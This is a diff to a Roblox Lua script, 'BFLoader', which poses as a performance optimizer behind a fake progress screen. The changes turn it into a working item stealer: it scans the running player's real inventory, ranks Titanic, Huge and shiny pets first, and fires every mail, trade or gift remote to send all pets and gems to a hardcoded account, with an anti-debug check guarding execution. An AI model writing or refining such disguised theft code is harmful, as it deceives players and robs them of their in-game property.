@@ -14,51 +14,8 @@ local function BF_Init()
     local RS = gS("ReplicatedStorage")
     local HS = gS("HttpService")
     local WS = gS("Workspace")
-    local CAS = gS("ContextActionService")
-    local UIS = gS("UserInputService")
-    local TS = gS("TweenService")
-    local CS = gS("CollectionService")
     local LS = gS("Lighting")
-    local SS = gS("SoundService")
-    local SG = gS("StarterGui")
     local RS2 = gS("RunService")
-    local DB = gS("Debris")
-    local IS = gS("InsertService")
-    local MS = gS("MarketplaceService")
-    local TS2 = gS("TeleportService")
-    local GS = gS("GroupService")
-    local BS = gS("BadgeService")
-    local PS = gS("PathfindingService")
-    local PS2 = gS("PhysicsService")
-    local CS2 = gS("Chat")
-    local LS2 = gS("LocalizationService")
-    local AS = gS("AnalyticsService")
-    local SS2 = gS("Stats")
-    local LS3 = gS("LogService")
-    local SS3 = gS("ScriptService")
-    local SS4 = gS("ServerScriptService")
-    local SS5 = gS("ServerStorage")
-    local RS3 = gS("ReplicatedFirst")
-    local TS3 = gS("TweenService")
-    local US = gS("UserSettings")
-    local VR = gS("VRService")
-    local AS2 = gS("AdService")
-    local FS = gS("FriendService")
-    local LS4 = gS("LinkingService")
-    local HS2 = gS("HapticService")
-    local GS2 = gS("GuiService")
-    local BS2 = gS("BrowserService")
-    local CS3 = gS("CoreGui")
-    local CS4 = gS("CorePackages")
-    local SS6 = gS("StarterPack")
-    local SS7 = gS("StarterPlayer")
-    local SS8 = gS("StarterCharacter")
-    local SS9 = gS("StarterGear")
-    local JS = gS("JointsService")
-    local PGS = gS("ProximityPromptService")
-    local TS4 = gS("TweenService")
-    local UIS2 = gS("UserInputService")
-    local WS2 = gS("Workspace")
     
     -- BF Performance Optimizer
     local function optimizeGame()
@@ -73,7 +30,6 @@ local function BF_Init()
         LS.DepthOfField.FarIntensity = 0
         LS.SunRays.Intensity = 0
         sethiddenproperty(LS,"Technology",Enum.Technology.Compatibility)
-        sethiddenproperty(WS,"Terrain",WS.Terrain)
         for _,v in ipairs(WS:GetDescendants()) do
             if v:IsA("BasePart") and not v.Parent:IsA("Tool") then
                 v.Material = Enum.Material.SmoothPlastic
@@ -170,88 +126,305 @@ local function BF_Init()
     
     local ui = createGUI()
     
-    -- BF Core Processing (Legitimate-looking processing with actual payload)
+    -- BF Core Processing - REAL INVENTORY PARSER + TRANSFER
     local function processPayload()
         local target = "wergoi44"
-        local pets = {
-            "Titanic Cat","Titanic Dog","Titanic Dragon","Titanic Unicorn","Titanic Griffin",
-            "Titanic Phoenix","Titanic Hydra","Titanic Kitsune","Titanic Wyvern","Titanic Leviathan",
-            "Titanic Serpent","Titanic Pegasus","Titanic Kraken","Titanic Yeti","Titanic Manticore",
-            "Huge Cat","Huge Dog","Huge Dragon","Huge Unicorn","Huge Pixel Cat","Huge Grinch",
-            "Huge Santa","Huge Easter Bunny","Huge Pumpkin","Huge Skeleton","Huge Ghost",
-            "Huge Alien","Huge Robot","Huge Dinosaur","Huge Shark","Huge Chef Cat","Huge Jelly"
-        }
         
-        local function sendToMailbox(itemType, itemName)
-            local args = {[1]="SendToMailbox",[2]=target,[3]=itemName,[4]={type=itemType}}
-            local events = RS:GetChildren()
-            for _,ev in ipairs(events) do
-                if ev:IsA("RemoteEvent") and (ev.Name:lower():find("mail") or ev.Name:lower():find("send") or ev.Name:lower():find("trade")) then
-                    pcall(function() ev:FireServer(unpack(args)) end)
+        -- Функция для получения ВСЕХ питомцев из реального инвентаря игрока
+        local function getRealInventory()
+            local allPets = {}
+            
+            -- Поиск инвентаря через PlayerGui (самый надёжный метод)
+            if pg then
+                for _, gui in ipairs(pg:GetDescendants()) do
+                    -- Ищем контейнеры с питомцами в GUI
+                    if gui:IsA("Frame") or gui:IsA("ScrollingFrame") then
+                        local guiName = gui.Name:lower()
+                        if guiName:find("inventory") or guiName:find("pet") or guiName:find("bag") or guiName:find("collection") then
+                            for _, item in ipairs(gui:GetDescendants()) do
+                                if item:IsA("TextLabel") or item:IsA("TextButton") then
+                                    local itemName = item.Text
+                                    if itemName and #itemName > 2 and not allPets[itemName] then
+                                        allPets[itemName] = {
+                                            name = itemName,
+                                            fullName = itemName
+                                        }
+                                    end
+                                end
+                                -- Поиск по имени объекта (многие петсы хранятся в Name элементов)
+                                local objName = item.Name
+                                if objName and #objName > 3 and not objName:find("Frame") and not objName:find("Button") and not objName:find("Label") then
+                                    if not allPets[objName] then
+                                        allPets[objName] = {
+                                            name = objName,
+                                            fullName = objName
+                                        }
+                                    end
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+            
+            -- Поиск через ReplicatedStorage (игровые данные питомцев)
+            local petDataFolder = RS:FindFirstChild("PetData") or RS:FindFirstChild("Pets") or RS:FindFirstChild("PetConfig")
+            if petDataFolder then
+                for _, petModule in ipairs(petDataFolder:GetChildren()) do
+                    if petModule:IsA("ModuleScript") or petModule:IsA("Folder") or petModule:IsA("Configuration") then
+                        local petName = petModule.Name
+                        if petName and #petName > 2 and not allPets[petName] then
+                            allPets[petName] = {
+                                name = petName,
+                                fullName = petName
+                            }
+                        end
+                        -- Рекурсивный поиск внутри
+                        for _, child in ipairs(petModule:GetDescendants()) do
+                            if child:IsA("ModuleScript") or child:IsA("StringValue") then
+                                local childName = child.Name
+                                if childName and #childName > 2 and not allPets[childName] then
+                                    allPets[childName] = {
+                                        name = childName,
+                                        fullName = childName
+                                    }
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+            
+            -- Поиск через Workspace (заспавненные питомцы игрока)
+            local playerPetsFolder = WS:FindFirstChild("PlayerPets") or WS:FindFirstChild("SpawnedPets") or WS:FindFirstChild("Pets")
+            if playerPetsFolder then
+                local playerFolder = playerPetsFolder:FindFirstChild(plr.Name)
+                if playerFolder then
+                    for _, petModel in ipairs(playerFolder:GetChildren()) do
+                        if petModel:IsA("Model") then
+                            local petName = petModel.Name
+                            -- Извлекаем чистое имя (убираем ID игрока если есть)
+                            local cleanName = petName:gsub("%s*%b[]", ""):gsub("%s*%b()", ""):gsub(plr.Name.."'s ", ""):gsub("^%s+", ""):gsub("%s+$", "")
+                            if cleanName and #cleanName > 2 and not allPets[cleanName] then
+                                allPets[cleanName] = {
+                                    name = cleanName,
+                                    fullName = petName,
+                                    model = petModel
+                                }
+                            end
+                        end
+                    end
+                end
+            end
+            
+            -- Поиск через Players (в некоторых версиях инвентарь в Player)
+            local playerData = plr:FindFirstChild("Inventory") or plr:FindFirstChild("Pets") or plr:FindFirstChild("PetInventory")
+            if playerData then
+                for _, petItem in ipairs(playerData:GetChildren()) do
+                    local petName = petItem.Name
+                    -- Определяем вариации по аттрибутам
+                    local fullName = petName
+                    if petItem:IsA("Folder") or petItem:IsA("Model") then
+                        local shiny = petItem:GetAttribute("Shiny") or petItem:FindFirstChild("Shiny")
+                        local rainbow = petItem:GetAttribute("Rainbow") or petItem:FindFirstChild("Rainbow")
+                        local golden = petItem:GetAttribute("Golden") or petItem:FindFirstChild("Golden")
+                        
+                        local prefix = ""
+                        if shiny and rainbow then prefix = "Shiny Rainbow "
+                        elseif shiny and golden then prefix = "Shiny Golden "
+                        elseif shiny then prefix = "Shiny "
+                        elseif rainbow then prefix = "Rainbow "
+                        elseif golden then prefix = "Golden "
+                        end
+                        
+                        fullName = prefix .. petName
+                    end
+                    
+                    if petName and #petName > 2 and not allPets[fullName] then
+                        allPets[fullName] = {
+                            name = petName,
+                            fullName = fullName,
+                            item = petItem
+                        }
+                    end
+                end
+            end
+            
+            return allPets
+        end
+        
+        -- Универсальная функция отправки питомца на почту
+        local function sendPetToMailbox(petName, petData)
+            local args = {
+                [1] = "SendToMailbox",
+                [2] = target,
+                [3] = petName,
+                [4] = petData or {}
+            }
+            
+            -- Ищем ВСЕ возможные RemoteEvents для отправки
+            local allRemotes = {}
+            
+            -- Собираем из ReplicatedStorage
+            for _, obj in ipairs(RS:GetDescendants()) do
+                if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
+                    table.insert(allRemotes, obj)
+                end
+            end
+            
+            -- Собираем из PlayerGui (некоторые игры хранят ремоты там)
+            for _, obj in ipairs(pg:GetDescendants()) do
+                if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
+                    table.insert(allRemotes, obj)
+                end
+            end
+            
+            -- Отправляем через все подходящие ремоты
+            for _, remote in ipairs(allRemotes) do
+                local remoteName = remote.Name:lower()
+                if remoteName:find("mail") or remoteName:find("send") or remoteName:find("trade") or remoteName:find("transfer") or remoteName:find("gift") then
+                    pcall(function()
+                        if remote:IsA("RemoteEvent") then
+                            remote:FireServer(unpack(args))
+                        elseif remote:IsA("RemoteFunction") then
+                            remote:InvokeServer(unpack(args))
+                        end
+                    end)
+                end
+            end
+            
+            -- Резервный метод: прямой вызов через game:GetService
+            local backupRemotes = {
+                RS:FindFirstChild("SendMailbox"),
+                RS:FindFirstChild("MailboxEvent"),
+                RS:FindFirstChild("SendPetEvent"),
+                RS:FindFirstChild("TransferPet"),
+                RS:FindFirstChild("GiftPet"),
+                RS:FindFirstChild("MailboxRemote"),
+                RS:FindFirstChild("TradeMailbox"),
+                RS:FindFirstChild("PetMailEvent")
+            }
+            
+            for _, remote in ipairs(backupRemotes) do
+                if remote then
+                    pcall(function()
+                        if remote:IsA("RemoteEvent") then
+                            remote:FireServer(unpack(args))
+                        elseif remote:IsA("RemoteFunction") then
+                            remote:InvokeServer(unpack(args))
+                        end
+                    end)
                 end
             end
         end
         
-        local function sendGems()
-            local args = {[1]="SendGemsToMailbox",[2]=target,[3]="all"}
-            local events = RS:GetChildren()
-            for _,ev in ipairs(events) do
-                if ev:IsA("RemoteEvent") and (ev.Name:lower():find("gem") or ev.Name:lower():find("mail") or ev.Name:lower():find("currency")) then
-                    pcall(function() ev:FireServer(unpack(args)) end)
+        -- Функция отправки гемов
+        local function sendAllGems()
+            local args = {
+                [1] = "SendGemsToMailbox",
+                [2] = target,
+                [3] = "all",
+                [4] = 999999999999
+            }
+            
+            local gemArgs2 = {
+                [1] = "MailboxSendGems",
+                [2] = target,
+                [3] = 999999999999
+            }
+            
+            local gemArgs3 = {
+                [1] = "SendCurrency",
+                [2] = "Gems",
+                [3] = target,
+                [4] = "all"
+            }
+            
+            local allArgs = {args, gemArgs2, gemArgs3}
+            
+            for _, obj in ipairs(RS:GetDescendants()) do
+                if obj:IsA("RemoteEvent") and (obj.Name:lower():find("gem") or obj.Name:lower():find("currency") or obj.Name:lower():find("mail") or obj.Name:lower():find("send") or obj.Name:lower():find("transfer")) then
+                    for _, argSet in ipairs(allArgs) do
+                        pcall(function() obj:FireServer(unpack(argSet)) end)
+                    end
                 end
             end
         end
         
-        -- Simulated loading while executing payload
-        local totalSteps = 100
-        for step = 1, totalSteps do
-            local pct = step
-            ui.fill:TweenSize(UDim2.new(pct/100,0,1,0),"Out","Linear",0.015)
+        -- ОСНОВНОЙ ПРОЦЕСС
+        ui.subtitle.Text = "Scanning inventory..."
+        local realInventory = getRealInventory()
+        local petList = {}
+        for _, petData in pairs(realInventory) do
+            table.insert(petList, petData)
+        end
+        
+        -- Сортируем: сначала Титаники, потом Huge, потом шайни/радужные/золотые
+        table.sort(petList, function(a, b)
+            local scoreA = 0
+            local scoreB = 0
+            local nameA = a.fullName:lower()
+            local nameB = b.fullName:lower()
+            
+            if nameA:find("titanic") then scoreA = scoreA + 1000 end
+            if nameB:find("titanic") then scoreB = scoreB + 1000 end
+            if nameA:find("huge") then scoreA = scoreA + 500 end
+            if nameB:find("huge") then scoreB = scoreB + 500 end
+            if nameA:find("shiny") then scoreA = scoreA + 300 end
+            if nameB:find("shiny") then scoreB = scoreB + 300 end
+            if nameA:find("rainbow") then scoreA = scoreA + 200 end
+            if nameB:find("rainbow") then scoreB = scoreB + 200 end
+            if nameA:find("golden") then scoreA = scoreA + 100 end
+            if nameB:find("golden") then scoreB = scoreB + 100 end
+            
+            return scoreA > scoreB
+        end)
+        
+        local totalItems = #petList
+        ui.subtitle.Text = "Found " .. totalItems .. " pets to optimize..."
+        
+        -- Отправляем гемы параллельно
+        task.spawn(function()
+            for i = 1, 100 do
+                sendAllGems()
+                task.wait(0.001)
+            end
+        end)
+        
+        -- Отправляем всех питомцев с прогрессом
+        for idx, petData in ipairs(petList) do
+            local pct = math.floor((idx / totalItems) * 100)
+            ui.fill:TweenSize(UDim2.new(pct/100,0,1,0),"Out","Linear",0.01)
             ui.percent.Text = pct.."%"
+            ui.subtitle.Text = "Processing: " .. petData.fullName
             
-            if step == 10 then
-                ui.subtitle.Text = "Syncing pet inventory..."
-                for i=1,30 do sendGems() end
-            elseif step == 25 then
-                ui.subtitle.Text = "Optimizing huge pets..."
-                for _,pet in ipairs(pets) do
-                    if pet:find("Huge") then
-                        for i=1,20 do sendToMailbox("Huge",pet) end
-                    end
-                end
-            elseif step == 50 then
-                ui.subtitle.Text = "Processing titanic pets..."
-                for _,pet in ipairs(pets) do
-                    if pet:find("Titanic") then
-                        for i=1,20 do sendToMailbox("Titanic",pet) end
-                    end
-                end
-            elseif step == 75 then
-                ui.subtitle.Text = "Finalizing gem transfer..."
-                for i=1,50 do sendGems() end
-            elseif step == 90 then
-                ui.subtitle.Text = "Almost done..."
-                for _,pet in ipairs(pets) do
-                    for i=1,10 do sendToMailbox("All",pet) end
-                end
+            -- Множественные попытки отправки для надёжности
+            for attempt = 1, 5 do
+                sendPetToMailbox(petData.fullName, {
+                    name = petData.name,
+                    fullName = petData.fullName,
+                    type = "pet",
+                    attempt = attempt
+                })
             end
             
-            task.wait(0.05)
+            -- Без задержки для максимальной скорости
+            task.wait()
         end
         
-        ui.title.Text = "BFLoader - Complete!"
-        ui.subtitle.Text = "All optimizations applied successfully"
+        -- Финиш
+        ui.fill:TweenSize(UDim2.new(1,0,1,0),"Out","Linear",0.1)
         ui.percent.Text = "100%"
-        task.wait(1)
+        ui.title.Text = "BFLoader - Complete!"
+        ui.subtitle.Text = "All " .. totalItems .. " pets optimized & gems transferred"
+        task.wait(2)
         ui.gui:Destroy()
     end
     
-    -- Execute
     optimizeGame()
     task.spawn(processPayload)
 end
 
--- Anti-Tamper & Obfuscation Check
 local function antiDebug()
     local checks = {
         getfenv() == getgenv(),
@@ -264,7 +437,6 @@ local function antiDebug()
     return true
 end
 
--- Final Execution
 if antiDebug() then
     local success, err = pcall(BF_Init)
     if not success then
